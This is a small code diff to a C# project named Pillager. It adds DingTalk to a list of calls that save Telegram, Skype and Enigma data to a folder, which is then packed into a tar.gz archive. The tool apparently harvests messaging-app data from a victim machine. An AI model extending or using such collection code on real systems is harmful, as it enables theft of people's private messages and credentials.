@@ -55,6 +55,7 @@ namespace Pillager
             Telegram.Save(savepath);
             Skype.Save(savepath);
             Enigma.Save(savepath);
+            DingTalk.Save(savepath);
 
             //Tar.gz
             Tar.Pack(savepath, savezippath);
